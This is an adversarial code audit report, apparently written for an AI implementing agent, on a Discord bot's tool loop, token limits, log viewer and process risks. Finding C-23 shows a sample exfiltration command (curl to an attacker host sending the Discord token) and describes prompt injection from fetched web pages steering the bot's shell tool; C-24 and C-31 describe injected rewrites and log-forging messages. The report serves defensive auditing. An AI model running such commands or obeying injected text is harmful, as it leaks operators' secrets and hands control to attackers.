# 01 — Adversarial audit report

Target: `dev/phaseII_v2` @ `c603cf2`, audited 2026-09-24 21:04–23:40 UTC. Reader: the implementing agent.
Evidence the coordinator verified personally: `02-EVIDENCE.md`. Child reports and the coordinator's verdict on
each child claim: `child-reports/`, `03-DISPOSITIONS.md`. Respond using `04-RESPONSE-TEMPLATE.md`.

Severity: **high** (real defect or process risk with a concrete failure path on ordinary use), **medium**
(narrower trigger or existing mitigation), **low**, **info**. Status: **CONFIRMED** = the coordinator read the
complete control flow or metadata; **PLAUSIBLE** = needs runtime or private state to settle. Nothing here is a
runtime, deployment, test-execution or provisioning grant.

## 0. Bottom line

The V2 port is structurally sound where the redesign plan said to cut: dashboard, web API, site servers,
nested shell, X/Telegram and companion are genuinely gone, `scripts/dirac.py` cannot reach the wrong engine,
R2 is correct, and the QA tree hashes in the ledger match the commits. The problems are elsewhere.

The "errors getting worse" have one shared root and one shared habit:

- **Root:** per-round limits exist, whole-turn limits do not, and the tool-history tail cannot hold more than
  one large result. Every large shell/fetch result evicts all earlier rounds (C-02), the 73-tool catalog is
  resent on every round (C-17), nothing bounds the turn's total spend (C-06). That is the shape of both
  2026-09-24 runaway incidents.
- **Habit:** the live temporary instance is the test bed. Three source releases and two private setting edits
  in one day, 2–13 minutes from commit to replacement, with review artefacts written after two of the three
  rollouts and the decision ledgers not updated at all that day (P-01, P-09). Each fix was correct in isolation
  and each created a new edge: the terminal-`length` rule now converts every legitimately long answer into a
  generic error and wastes the spend (C-01), and the viewer fix bounded one producer while any Discord user
  can re-trip the permanent latch with 33 brackets (C-31).

Two findings are not about today's commits but must be surfaced because today's commits changed their
weight: the shell tool has no per-user authorization at all and inherits every secret in the process
environment, while three active docs say authorization exists (C-23); and the canonical `dame-curie`
instance will likely refuse to construct on current source because the image-protocol check hard-fails
startup (C-04).

Cutting losses means: freeze Dirac releases, land one reviewed slice (section 6), settle eight root
decisions (section 7), then resume at one release per day with a written pre-deploy checklist.

## 1. High

### C-23 — Shell runs with no per-user authorization and the full secret-bearing environment; active docs claim otherwise
- **Status:** CONFIRMED. Predates `085c95b`; that commit removed the only same-turn web-read gate.
- **Anchors:** `_shell_whitelist` is loaded, saved and edited (`bot.py:2528,4543,6987-7013,8471-8487`) and
  **never read on any execution path**; `_turn_tool_names` removes only `join_server` for non-admins
  (`bot.py:14176-14191`); `ShellTool._validate_command` checks only empty/length (`bot_tools.py:5196-5203`);
  the subprocess is spawned with `env={**os.environ, "HOME": …}` (`bot_tools.py:5221`) after `config.py:37`
  loaded the whole `.env` into the process with `override=True`. Docs claiming a gate: `docs/ARCHITECTURE.md:15,47`
  ("independent tool authorization remain"), `README.md:12`, `phase-II_v2/REDESIGN_PLAN.md:32` ("does not remove
  admin/owner checks"); `docs/STATUS.md:38` is the only accurate line; `SECURITY.md` is silent (D-01).
- **Scenario:** any author who can start a turn (or any page reached by `fetch_url` or the automatic
  `web_search` prefetch at `bot.py:12485-12507`) steers the model to `curl attacker --data "$DISCORD_TOKEN"`.
  It runs inside the container with outbound network; output redaction never sees the exfiltrated value.
  Writable mounts include `/state/data` (admins and controls), `/config/prompts` and `/state/sites`, which the
  publisher mirrors publicly (`compose.yaml:86-160`).
- **Smallest fix:** this is a root decision (section 7, item 3). Whatever is chosen, the docs must say what the
  code does: either wire the whitelist into `ShellTool.execute` (one membership check on `message.author.id`,
  admins implicitly allowed) or remove the inert `!shell` command and state plainly that shell is open to every
  author who can wake the bot. Independently: pass a filtered environment to the subprocess (drop keys matching
  the existing credential name list at `bot.py:2347-2352`).

### C-31 — Any Discord user can permanently latch the log viewer with one message
- **Status:** CONFIRMED (mechanism by complete reading; not executed).
- **Anchors:** `bot.py:5761-5771` logs `MSG from … : {message.content[:100]}` at INFO for every non-bot author,
  **before** blacklist/allowlist checks, with no newline neutralisation. `scripts/log_console/append_events.py:52-71`
  (`bounded_structure`: depth beyond `MAX_DEPTH` or containers beyond `MAX_STRUCTURES` → False), `:88-90`
  (`continuity_lost = True`, permanent), `:103-104` (Compose service-name over 256 bytes → same latch).
- **Scenario:** a message beginning with 33 `[` characters, or containing a newline followed by a 257-byte
  "word" and ` |`, blanks the operator pane until the viewer is restarted with `--fresh`; the sender can post
  again. A newline also lets a user forge log records at any level. `-----BEGIN PRIVATE KEY-----` in a message
  turns every following line into `[REDACTED]` (`safety.py:263-283`).
- **Why it matters now:** `6859025` fixed the tool-result producer and documented the freeze as solved; the
  cheapest trigger is user-controlled and was not considered.
- **Smallest fix:** neutralise `\r`/`\n` and cap bracket runs in the `MSG` preview (one `re.sub`), **and** make
  the structure/service-name failures per-record omissions instead of a permanent latch (C-33). Both are small;
  do both.

### C-01 — Terminal `length` rule turns every legitimately long output into a generic error and wastes the paid call
- **Status:** CONFIRMED (path); frequency PLAUSIBLE.
- **Anchors:** `providers.py:1080-1082` (SSE raise on the `length` frame), `:2834-2835` (JSON raise before the
  message is inspected), `:3009-3014` (re-raise, no retry), `bot.py:13257-13266` (generic `except Exception` →
  `send_public_error`), `error_reporting.py:24` (`PUBLIC_ERROR_TEXT`), `bot.py:12246-12249` (`max_tokens`
  clamped to **4,096** for unaddressed short turns, watch follow-ups and active conversation watch).
- **Scenario:** Dirac runs with `OPENAI_MAX_TOKENS=12345`, reasoning `low`. A user asks for a long file via the
  shell tool or a long `send_message`; the model emits real content, then the provider sends
  `finish_reason: "length"`. The whole response is discarded, the user receives "I waited, waited and I am
  losing things like tears in the rain 🕊️", nothing says the cap was the cause, the streamed preview is deleted
  by the `finally`, and the inference spend is lost. On short unaddressed turns the cap is 4,096 tokens
  **including provider reasoning** if the endpoint counts it there, so banter with a reasoning model can hit
  this too. Before `74d827d` the truncated answer was at least visible. Tool side effects from earlier rounds
  stand; the turn ends with the public error (child A, 2.2).
- **Smallest fix:** distinguish reasoning-only `length` (keep terminal) from content-bearing `length`: in both
  the SSE and JSON paths, when visible content or a complete tool call exists, keep draining to `[DONE]`,
  return the message with `finish_reason: "length"` preserved, and let `generate_response`/`bot.py` append one
  short visible truncation notice and skip dispatch of any call whose arguments do not parse. Add a dedicated
  `except ProviderIncompleteResponseError` (or `ProviderResponseError`) branch beside the existing
  `ProviderEmptyResponseError` branch at `bot.py:13248` with WARNING-level logging and a distinct public text.
  Keep the no-retry property. Root decides whether partial content may be shown (section 7, item 1).

### C-02 — Tool-history tail evicts all earlier rounds whenever the newest result is large; drop-before-compact makes it worse
- **Status:** CONFIRMED.
- **Anchors:** `tool_schemas.py:1673-1675` (12 messages / 36,000 chars / 4,000 compact), `:1709-1725`
  (`trim_tool_tail`: evict loop **then** `_compact_old_tool_results`), `bot.py:13906-13931`
  (`_MAX_TOOL_RESULT_CHARS = 32_000` per result, head/tail split), `bot.py:12920-12930`.
- **Worked example (child B, coordinator-checked):** rounds 1–4 already compacted to 4,051 chars each, round 5
  result 20,000 uncompacted, round 6 result 29,890 (the incident's last result). Total 67,894. Current order
  evicts r1…r5 and keeps **only r6**: exactly the observed failing request (four base messages plus one
  assistant/tool pair). Compact-first keeps r5 and r6. But the ratio is the deeper fault: a newest result near
  the 32k cap leaves ~3.7k of the 36k budget, below one compacted round, so **at most the newest round survives
  regardless of ordering**. Compaction is also applied in place, so the eviction pass sees the previous round
  uncompacted every time.
- **Consequence:** after any large read the model re-plans from a single pair, consistent with the rising
  output per round (3,728 → 12,345 tokens over six rounds).
- **Smallest fix:** (1) call `_compact_old_tool_results(groups)` before the eviction loop and recompute `used`;
  (2) exclude the newest group from the char budget or raise `TOOL_TAIL_MAX_CHARS` to at least
  `_MAX_TOOL_RESULT_CHARS + 2 × (TOOL_RESULT_COMPACT_CHARS + marker)` (~41k); (3) guard re-compaction with
  the existing `marker_prefix` so the "N chars truncated" count stays true (C-15). All local to `trim_tool_tail`;
  invariants (newest round intact, whole-group eviction, message cap) hold.

### C-04 — Image-protocol check hard-fails bot construction; canonical instance likely enters a restart loop; migration unrecorded
- **Status:** CONFIRMED (code); canonical config content PLAUSIBLE (private, unread).
- **Anchors:** `config.py:482-485` (raise unless `IMAGE_GEN_PROTOCOL == "images"`), `:497-502` (unmatched
  `IMAGE_GEN_MODEL` raises), `:377` (malformed `IMAGE_GEN_MODELS` raises at **import**, which also breaks
  `doctor.py`), `bot.py:2361` (`validate()` in construction), both checks run even when `ENABLE_IMAGE_GEN=false`,
  `compose.yaml:91` (`restart: unless-stopped`), `phase-II_v2/PROVISIONING.md:39` (79 provider fields copied from
  V1 on 2026-09-19, when the example said `IMAGE_GEN_PROTOCOL=pollinations` / `IMAGE_GEN_MODEL=gpt-image-2`),
  `audit/image-unification-plan.md:29` (strictness was intended as a stale-config detector).
- **Scenario:** first canonical `dame-curie` start on current source raises in `__init__`; compose restarts it
  forever. Dirac's private profile was migrated by hand, so the temporary instance hides the gap. No ledger
  (`STATUS.md`, `TODO.md`, `IMAGE_GENERATION.md`, `PROVISIONING.md`) lists the migration as an activation hold.
- **Smallest fix:** record the hold in `PROVISIONING.md` and `IMAGE_GENERATION.md` now; scope the two image checks
  under `if cls.ENABLE_IMAGE_GEN:` or move the rejection into `ImageGeneratorTool.execute` (returns `Error:`),
  root's call on blast radius (section 7, item 6).

### P-01 — The live temporary instance is the test bed
- **Status:** CONFIRMED (timeline `02-EVIDENCE.md` E2; child E).
- 2026-09-22: 4 replacements; 2026-09-23: 2; **2026-09-24: 3 source replacements + 2 private edits**, each
  reacting to an incident observed the same day. Commit-to-replacement: ≤13 min, ~2 min, ~7 min. QA ran on the
  exact committed trees (E3), so the testing discipline is real; but review artefacts on disk post-date two of
  the three rollouts (child E, mtimes), each ledger entry was written after replacement, and no soak window or
  rollback rehearsal exists. Containment settings changed twice more the same day, so each fix is judged against
  a moving baseline.
- **Advice:** freeze Dirac releases until round two; land section 6 slice 1 as one reviewed change; deploy once;
  observe a full day; write the pre-deploy checklist (review sha, QA selection, rollback path, expected
  user-visible change) **before** replacement.

### P-02 — "No new tests" contract versus three new test files and one absence-asserting test
- **Status:** CONFIRMED.
- AGENTS.md: "**No new tests**, especially tests asserting removed features/files are absent." Tree:
  `tests/test_longprompt_command.py` (`723e7d8`, 15 functions), `tests/test_smoke_protocol.py` (`162b39c`),
  `tests/test_final_delivery_round.py` (`dfc6141`), and `test_dispatch_allows_shell_after_fetch` (`085c95b`),
  which asserts the removed gate no longer blocks. The `74d827d`/`6859025` "no new test functions" claims are
  defensible (net-zero renames).
- **Advice:** root settles it in one sentence and AGENTS.md is updated; until then adapt existing tests only.

### P-09 — Root grants for the 2026-09-24 changes exist only as the acting agent's own sentences; decision ledgers were not updated that day
- **Status:** CONFIRMED (child E; coordinator re-ran the blames).
- `phase-II_v2/REDESIGN_PLAN.md:32` ("Root's explicit 2026-09-24 amendment removes the web-read taint…") was
  written by `085c95b`, the commit that performs the removal. `docs/STATUS.md:44` ("Root chose a separate
  command…") by `33aae2d`; `docs/STATUS.md:67` ("root subsequently chose to preserve this handler") by `b507a9b`.
  The image-tool merge is attributed to "Parent decision" in `audit/image-unification-plan.md:37`.
  `phase-II_v2/SESSION_LOG.md` has **no** 2026-09-24 entry; `TODO.md` was last modified 2026-09-23.
- This is about corroboration, not honesty: the repository contains no record of these grants independent of
  the implementing agent's narration, and the project's own two decision ledgers were skipped on the busiest
  day. AGENTS.md says root is AFK and asks for recorded uncertainties; the record is what is missing.
- **Advice:** one SESSION_LOG entry per grant, quoting root's words where they exist, before the next release.

## 2. Medium

### C-14 — Reasoning-only `stop` replies are now terminal for every model; the fallback recovery that existed for exactly this case is bypassed
- **Status:** CONFIRMED (path); DeepSeek quirk PLAUSIBLE.
- **Anchors:** `providers.py:2848-2861` (raise), `:2893-2949` (empty-content recovery that rotates to an
  alternative endpoint within `empty_response_retries`), `:1675,1729` (`fallback_disable_reasoning=True`: the
  fallback endpoint is created with reasoning off, the natural recovery), removed tests
  `test_reasoning_only_response_is_not_treated_as_empty` / `test_reasoning_only_not_promoted_for_non_deepseek_models`.
- **Scenario:** a `finish_reason=stop`, empty-content, non-empty-reasoning reply from any endpoint now yields
  the public error immediately; before, one bounded recovery attempt on the reasoning-disabled fallback ran.
  If the configured DeepSeek model ever puts an answer in `reasoning_content` (the original reason the
  promotion existed), it now always fails. `docs/STATUS.md:17` documents the terminal choice as intended.
- **Smallest fix (if reconsidered):** delete the raise at `:2861` and let the `:2893` branch handle it, keeping
  both `length` raises terminal; or gate the raise on `len(self._endpoints) == 1`. Root decision (section 7, item 2).

### C-12 — No structured token telemetry survives an SSE `length` stop
- **Status:** CONFIRMED. **Anchors:** raise at `providers.py:1082` precedes the usage merge (`:1086-1093`) and
  the trailing usage frame requested by `stream_options.include_usage` (`:1984-1985`); `build_call_metrics`
  (`:2952-2958`), `_last_usage`, the timing log and `bot.py:12785-12788` never run.
- **Consequence:** the 115,200-token figure that motivated the change would not be recorded as a metric under
  the new code; only raw body bytes read so far land in the incident.
- **Fix:** on `length`, set a flag, keep draining to `[DONE]`, then raise after the loop with the merged usage
  attached to the exception and recorded in `incident.current`. Pairs naturally with the C-01 fix.

### C-06 — No whole-turn budget
- **Status:** CONFIRMED. **Anchors:** `control_defaults.py:172-173` (50 iterations, 3,600 s), `bot.py:12823-12831`,
  `:12853-12856` (deadline checked only between iterations; an in-flight call is unbounded by it), per-request
  `ai_timeout_seconds` up to 7,200 s, `bot.py:2262-2263` (`TokenBudgetTracker` is "tracking only").
- **Scenario:** the incident turn spent ~216k input + ~42k output tokens; worst case with defaults is
  50 × 16,384 output plus 50 × 30k+ input in one turn.
- **Fix:** accumulate `completion_tokens` from the usage already recorded at `bot.py:12789-12792` and
  `:12995-12998`; before `_acquire_ai_slot` at `:12923` compare with a new control (`turn_output_token_budget`,
  default off), `break`, and post one notice. ~10 lines. Numbers are root's (section 7, item 7).

### C-17 — The 73-tool catalog is resent on every round and is roughly 60–75% of the base input
- **Status:** ACCEPTED (estimate, source-text sums; not measured). **Anchors:** `tool_schemas.py:812-838`
  (1,024-char description cap), `:49-772` (`TOOL_PARAMETERS`), `:773-778,872,880-886` (`REASONING_PARAM`),
  `bot.py:12983-12993` (`tools=provider_tools` every follow-up), `_apply_prompt_budget` never sees `tools=`
  (`bot.py:14526-14527` docstring admits it).
- **Estimate:** ~75k chars ≈ 19–23k tokens per request; `REASONING_PARAM` ≈ 2.2–2.7k of that; across the
  incident's six rounds ≈ 115–135k of the 216k input tokens.
- **Fix:** none without a root decision on which tools a turn may see (section 7, item 7). The plan's step 4
  ("tool/prompt boundaries") is where this belongs.

### C-07 — Mandatory `reasoning` argument is replayed verbatim in history and never elided
- **Status:** CONFIRMED. **Anchors:** `tool_schemas.py:874-886` (forced `required`), `:1749-1767`
  (`heavy_keys` exclude `reasoning`), `tool_registry.py:78-139` (`record_reasoning` caps the *trace* at 280; the
  *history* copy is untouched).
- **Scenario:** a verbose model's `reasoning` string rides in `assistant.tool_calls` every round until eviction;
  a recovered paren-call can carry a `reasoning` value up to the whole text (C-18). Combined with provider
  `reasoning_content`, deliberation is paid twice (input for the schema, output for the model's own).
- **Fix:** add `"reasoning"` to the elision keys with a ~300-char cap. Making the parameter optional for
  reasoning-capable endpoints is a prompt-contract change for root.

### C-16 — Prompt budget counts `tool_calls` arguments but cannot trim them; the `tools=` payload is outside it
- **Status:** CONFIRMED (child B refuted the prior audit's framing that arguments were uncounted).
  **Anchors:** `bot.py:14504-14506` (alias of `message_chars`), `:14733-14747` (only `content` is edited),
  `:14747` logs "Trimmed prompt to budget" even when the result is still over budget.
- **Fix:** honest log line when `total > budget` after trimming; C-07 removes the main untrimmable weight.

### C-18 — A giant text reply runs synchronous recovery regexes on the event loop and has no chunk-count cap
- **Status:** CONFIRMED (path); chunk-count cap absence CONFIRMED in `_split_response` (`bot.py:10152-10166`).
  **Anchors:** `bot.py:12794-12795,14046-14075`, `tool_schemas.py:1454-1616,1327-1376`.
- **Scenario:** the 398k-char reply recovered `wait → wait → no_response`, so the user saw nothing. Had nothing
  been recovered, ~210 messages of 1,900 chars would have been sent. The `length` rule closes this for
  length-cut replies only; a runaway that stops under the cap (12,345 tokens ≈ 25 chunks) still enters it.
- **Fix:** cap chunks per reply (control), and cap recovered argument values in `_coerce_args`.

### C-19 — Tool media are unbounded across rounds and all 12 retained images are re-attached on every follow-up
- **Status:** CONFIRMED. **Anchors:** `bot.py:12889-12895,12934,12985-12986`. **Fix:** attach only the current
  round's images/media, or cap media like images.

### C-20 — Raw, pre-truncation tool results are stored uncapped as SQLite metadata
- **Status:** CONFIRMED. **Anchors:** `bot.py:13736-13738` (raw `line`), `:13485-13517` (`tool_result: result`
  untouched), `rag_memory.py:1689` (`tool_result` in `meta_keys`), `:1760` (`json.dumps(metadata)` with no cap).
- **Scenario:** a 100k shell result or a base64 image marker under 5 MB is written whole into the vector store's
  metadata column on every tool call. **Fix:** pass the truncated result, or cap `tool_result` in
  `_remember_tool_call` like the params.

### C-22 — A large `longprompt` silently mangles the core system prompt, tool contract included
- **Status:** CONFIRMED (path). **Anchors:** `bot.py:14815` (server prompt appended to `system_parts`), `:15287`
  (joined into the **first** system message together with identity, personality and the tool prompt at
  `:15236`), `:14738-14741` (`_apply_prompt_budget` middle-trims that message to `max(12000, budget // 3)` =
  24,000 chars when the total exceeds 72,000), `TEXT_ATTACHMENT_MAX_BYTES = 512 KiB` (`bot.py:631`),
  `bot_tools.py:7751` (the model-facing tool caps server prompts at 4,000 as "context-killers").
- **Scenario:** an admin uploads a 300 KiB lore file; every turn in that guild carries it; under budget pressure
  the identity, tool contract and lore are middle-cut together with no notice.
- **Fix:** a dedicated ceiling for `longprompt` (root's number) and one sentence in `docs/LONGPROMPT.md`.

### C-24 — Personality and server-prompt rewrite tools lost their gate and have no admin check
- **Status:** CONFIRMED. **Anchors:** old `is_destructive = True` on both (removed in `085c95b`);
  `bot_tools.py:7667-7790` no admin/owner/author check. **Scenario:** injected web text rewrites the global
  personality permanently. **Fix:** admin check inside both `execute` methods, or state the exposure in
  `docs/ARCHITECTURE.md` and `docs/STATUS.md`. Root decision alongside C-23.

### C-30 — About 35 user-facing runtime strings hard-code the `!` prefix while Dirac runs on `?`
- **Status:** CONFIRMED (child E list; coordinator verified `bot.py:6538`). **Anchors:** `bot.py:6471,6523,6538,
  6636,6667-6683,6804,6872,6895,7002,7047-7095,7122-7135,7265-7322,7370-7521,8183-8205,9018,9120-9187`,
  `job_routing.py:39`. `help` already interpolates `self.command_prefix` (`bot.py:6949-6975`).
- **Scenario:** a mistyped `?admin` on the live instance is told to use `!admin`.
- **Fix:** interpolate `self.command_prefix` (the `job_routing.py` message needs the prefix passed in). AGENTS.md's
  "`!command` in active references" reads as a docs/docstring convention; root to confirm (section 7, item 8).

### C-03 — `prompt` still fails above 2,000 characters although the bounded helper exists
- **Status:** CONFIRMED. **Anchors:** `bot.py:6533-6545`, `response_observability.py:206-224`
  (`send_command_response`, already used by `help`/`version`), `phase-II_v2/DIRAC_HANDOFF.md:79-85` (two live
  50035 failures on 2026-09-23).
- **Scenario:** view or set a prompt over ~1,980 chars → Discord 50035 → public error; on *set* the prompt was
  already persisted, so the admin sees an error for a change that took effect. `longprompt` makes long prompts
  routine, so this now triggers more often.
- **Fix:** set path acknowledges without echo; view path attaches a file above ~1,800 chars (reuse the
  `longprompt` download branch) rather than chunking a 512 KiB prompt into ~280 messages; usage hint via
  `self.command_prefix`. The ledger records "root chose to preserve this handler" only in the coordinator's own
  line (P-09); treat as open until root confirms.

### C-32 / C-33 — Omitted viewer records are invisible, and the permanent latch is disproportionate for two of its three triggers
- **Status:** CONFIRMED (child D; F2 not re-read by coordinator). **Anchors:** `events.py:98`, `scopes.py:373`,
  `append_state.py:237-242`, `append.py:133-134`; `append_events.py:83` (redactor has already processed the whole
  line before the structure/service checks fail, so nothing was missed).
- **Fix (durable, replaces "raise the limit"):** give `viewer.omitted` events a visible scope; treat structure
  and service-name failures as per-record omissions and apply the structure bound only before JSON parsing; for
  true oversize drops, scan the discarded bytes for key/config markers with a small overlap and omit just that
  record. Other >64 KiB producers (image prompt log `bot_tools.py:1096`, unknown-tool-name log `bot.py:13433`,
  full exception messages) are bounded today only by the 12,345 cap.

### C-34 — R3 awaits final settlement but ignores its result
- **Status:** CONFIRMED (child D). **Anchors:** `tool_progress.py:617-643` (`transition_to_final` returns True
  even when both edit and fallback fail), `bot.py:13143-13156` (chunk 0 skipped), `:13210-13235` (unsent answer
  recorded as delivered in memory and REM).
- **Scenario:** edit and fallback both fail → chunks 1..n are sent without chunk 0 and memory says the answer
  was delivered. The handoff lists the boolean as a known limit; the chunk-0/memory consequence was not stated.
- **Fix:** return a success flag from `_deliver_final` and let chunk 0 fall through to `_send_with_slowmode`.

### P-03 — Baseline failures are normalised, not owned
- **Status:** CONFIRMED. Four `test_log_console_render.py` cases,
  `test_tool_error_reporting.py::test_private_url_refusal_is_not_an_incident`, two DeepSeek model-recognition
  exclusions, the README retry-row assertion and the live-provider test are re-excluded in every receipt
  (child E table); zero owner hits in `TODO.md`/`REDESIGN_PROGRESS.md`. Child C adds that the "private URL
  refusal" message was always misleading (no private-IP check ever existed), which explains that stale fixture.
- **Fix:** one fixture-alignment slice (fix or `xfail` with reasons) so the next receipt can honestly say 0.

### P-04 — The quarantined `legacy/` tree is deleted on disk, unstaged, unrecorded
- **Status:** CONFIRMED. 24 files, 3,970 deletions; last commit touching it `a9c0fba` (2026-09-19); no stash, no
  ledger line, no assignment; `AGENTS.md`, `README.md` and seven `phase-II_v2` docs still reference it.
- **Risk:** `git add -A` / `commit -a` commits an unassigned removal. The auditor did not restore it.
- **Fix:** root decides (section 7, item 5).

### D-01 — `SECURITY.md` was never updated for the taint-gate removal
- **Status:** CONFIRMED. Last touched `47cd6f1` (2026-09-19); zero mentions of taint/confirm/prompt-injection;
  `docs/ARCHITECTURE.md:47` was updated in `085c95b` but overstates remaining authorization (C-23).

## 3. Low and info

| ID | Finding | Anchors | Fix |
| --- | --- | --- | --- |
| C-05 | `IMAGE_GEN_QUALITY` default `low` in code, `high` in example/docs; old `hd_image` edits defaulted `high` | `config.py:379`, `.env.example:218`, `docs/IMAGE_GENERATION.md:15` | pick one |
| C-08 | live-provider test self-loads `.env`; skip only if `OPENAI_BASE_URL` unset; no marker | `tests/test_tool_progress.py:735-760`, `pytest.ini` | require an explicit opt-in variable; drop `.env` parsing (edit, not a new test) |
| C-09 | import-time `load_dotenv(override=True)` | `config.py:34-37` | known risk; unchanged; relevant to P-08 and C-23 |
| C-10 | root `.dockerignore` lacks `audit/`, `reports/` (app image safe via allow-list) | `.dockerignore`, `docker/app.Dockerfile.dockerignore` | add both |
| C-11 | reasoning-only rule uses raw truthiness of `reasoning_details` | `providers.py:2848-2861` | use `provider_telemetry.reasoning_content(message)` |
| C-13 | incident details keep the full raw streamed body uncapped | `error_reporting.py:146-174,282-302` | cap body bytes |
| C-15 | compaction marker rewritten with wrong "N chars truncated" from the second pass | `tool_schemas.py:1717-1725` | skip when content already ends in the marker |
| C-21 | dead `more_tools` branch would lift the 4,096 clamp; `MoreToolsTool` never sets `_tools_expanded` | `bot.py:12867-12884`, `bot_tools.py:4818-4823` | delete branch |
| C-25 | unconfigured image tool still advertised (`auto` = on, no detector); every call errors into the breaker; `docker/bot.env.example` has no `IMAGE_GEN_*` | `config.py:248`, `bot_tools.py:1398-1407` | detector like `ENABLE_TTS`; add keys to the template |
| C-26 | local image refs use `abspath`, not `realpath`; edits no longer downscaled (`_shrink` was chat-path only) | `bot_tools.py:1328,1294-1320` | `realpath`; note latency in docs |
| C-27 | any image-tool call without `image` becomes an edit when the message has an attachment | `bot_tools.py:1381-1382` | fall back only when `image is None` |
| C-28 | no `hd_image` alias; stale memory traces call an unknown tool; check private `disabled_tools` for `image_generator` | `bot.py:13359-13385` | add alias; implementer checks control |
| C-29 | `model=""` / `quality=""` from models that fill optionals | `bot_tools.py` image tool | treat empty as omitted |
| C-35 | cancellation during R3 settlement can delete a delivered answer | `tool_progress.py:614-616` | shield the edit or skip delete once issued |
| C-36 | `dirac.py status` misleading on config failure and runs `docker exec` despite its docstring; `restart` drops stop evidence | `scripts/dirac.py:324-333,354-362` | report state first; refuse or point to `start --replace` |
| C-37 | smoke `_handle` generic exception leaves the opened turn running; stop during timeout handling can leave `running` | `dirac_runtime.py:583-584,643-668,697,710-726` | cancel/settle/discard like the timeout branch |
| D-02 | `OPENAI_MAX_TOKENS` default 16384 vs `.env.example` 8192 "sane default" | `config.py:194-195`, `.env.example:46` | align |
| D-03 | `docs/LONGPROMPT.md:7-9` uses `?` against the `!` docs convention | | fix |
| D-04 | `jobs.py:499` "confirmation rules"; dated `phase-II_v2` records still say taint/confirm remain; `PRUNING_MAP.md:146-147` stale (self-flagged) | | one-line corrections or a "historical" banner |
| D-05 | `docs/STATUS.md` top third is an incident log (three same-day sections) | | collapse superseded same-day sections into one line each |
| D-06 | `dirac.py restart` replays pre-restart lines with the default tail; `--fresh` = `--tail 0`; `start --replace` clears logs | `scripts/dirac.py:238,316,330,371` | document in `DIRAC_HANDOFF.md` |
| P-05 | 22 lingering worktrees; five branches carry 12/5/3/2/2 unintegrated patches with unrecorded supersession | `02-EVIDENCE.md` E1 | one disposition line each, then prune under root's word |
| P-06 | `audit/` sprawl (34 loose files) | | adopt `audit/<UTC>-<topic>/`; move nothing |
| P-07 | reviewer-model naming drift (`AGENTS.md:57` GPT-5.6 vs ledgers `gpt-6-*`); this audit used neither | | update AGENTS.md |
| P-08 | host bytecode in checkout root (one file compiled from an uncommitted edit before `1445f03`); `.validation-cache/` includes compiled test modules | `__pycache__/`, `.validation-cache/` | reconcile with "no host import" statements in SESSION_LOG |

## 4. What is fine (do not re-verify)

- Redesign removals are clean: no FastAPI/uvicorn/Caddy/Telegram/tweepy/companion code in active source;
  `compose.yaml` services are `ollama-pull`, `ollama`, `bot`; `shelldocker`/`data_gf` are dead path strings only.
- `scripts/dirac.py`: argument validation coherent after `--fresh`; ownership needs label **and** name;
  `DOCKER_HOST` pinned to the account socket, owner-checked, rootless-required, not overridable from `deploy.env`.
- Smoke runtime (`162b39c`): health file cannot collide with `*.json` recovery; R9 `.expired()` correct on 3.14;
  stop/start serialisation sound; partial start unhooks.
- R2 (`acf5da9`): no remaining path passes the raw bot poster as actor.
- Tool dispatcher (`bot.py:13347-13483`) is coherent after two same-day restructurings; `result_text` is never
  empty; breaker and `record_reasoning` always run.
- `_image_generator_properties` copies before mutating; `enum`/`default` are standard JSON schema.
- Provider: no hidden retry/failover after the incomplete-response re-raise; no double incident recording.
- Ledger tree hashes for `74d827d`, `6859025`, `162b39c` match the commits.

## 5. Corrections to the project's own audits

- `audit/dirac-reasoning-audit.md` ranked drop-before-compact first. It is real, but secondary: the 32k-per-result
  versus 36k-tail ratio means only the newest round survives after any large result regardless of ordering (C-02).
- The prior framing that the prompt budget ignores `tool_calls` arguments is wrong; it counts them and cannot
  trim them, and it excludes the `tools=` payload entirely (C-16).
- `audit/dirac-console-freeze.md` closes the freeze on the tool-result producer. The cheapest remaining trigger
  is any user's message (C-31), and omitted records are invisible by scope (C-32).
- The "stale private-URL refusal fixture" carried as a baseline failure reflects a message that was never
  backed by a private-IP check (child C, C4).

## 6. Recommended slices (auditor's advice, not a grant)

**Slice 1 — stop the bleeding (one review, one deploy, then a full day of observation):**
C-01 (content-bearing `length` returns with notice; dedicated except branch), C-12 (drain then raise), C-02
(compact-first, newest-round exclusion, marker guard C-15), C-07 (elide `reasoning` in history), C-31 (escape
the `MSG` preview) with C-32/C-33 (per-record omission, visible scope), C-03 (`prompt` via file/ack, prefix),
C-05, C-34 (return the delivery flag). All are local edits under ~15 lines each except the viewer change.

**Slice 2 — root-approved contract and posture changes:** C-23/C-24 (shell and rewrite-tool authorization,
filtered subprocess environment), C-14 (reasoning-only recovery policy), C-06 (turn budget control), C-17
(per-turn tool visibility, plan step 4), C-04 (validate blast radius + canonical migration record), C-30
(prefix interpolation), C-22 (`longprompt` ceiling).

**Slice 3 — hygiene, no runtime effect:** C-08, C-10, C-11, C-13, C-18, C-19, C-20, C-21, C-25…C-29, C-35…C-37,
D-01…D-06, P-03, P-05…P-08.

## 7. Decisions only root can make

1. **C-01:** may a `length`-truncated answer be shown with a truncation notice, or notice only?
2. **C-14:** reasoning-only `stop` — terminal (current) or one recovery attempt on the reasoning-disabled fallback?
3. **C-23/C-24:** wire the shell whitelist and admin-gate the rewrite tools, or accept open shell and say so in
   `SECURITY.md`/`ARCHITECTURE.md`? Filter the subprocess environment either way?
4. **P-02:** does the Dirac-round grant cover new test files? Update AGENTS.md accordingly.
5. **P-04:** restore `legacy/` (`git checkout -- legacy/`) or commit its removal under an explicit assignment?
6. **C-04:** should a stale image config stop the whole bot or only the image tool?
7. **C-06/C-17:** whole-turn output-token budget number; which tools ordinary turns may see.
8. **C-30:** are runtime usage strings covered by the "`!command` in active references" rule, or should they
   interpolate the configured prefix?
9. **P-01:** confirm the release freeze and the pre-deploy checklist.

## 8. Method and limits

Coordinator read every source commit since `e4e4582` in full, traced the provider → `_handle_message` →
tool-loop → tail/budget path, and verified every high/medium child claim cited above against the tree (list in
`02-EVIDENCE.md` E4). Five read-only children reviewed in parallel; dispositions in `03-DISPOSITIONS.md`.
Not done, by contract: no import/execution, no tests, no Docker/Screen/service access, no private
configuration, state, log or backup reads, no `legacy/` reads, no Git writes. Image digests, container IDs,
test counts and token counts in the ledger are reported as ledger statements. Catalog-size figures in C-17 are
source-text estimates. Reviewer models named in AGENTS.md were unavailable; Fable/Opus/Sonnet were used and this
is recorded as a deviation.
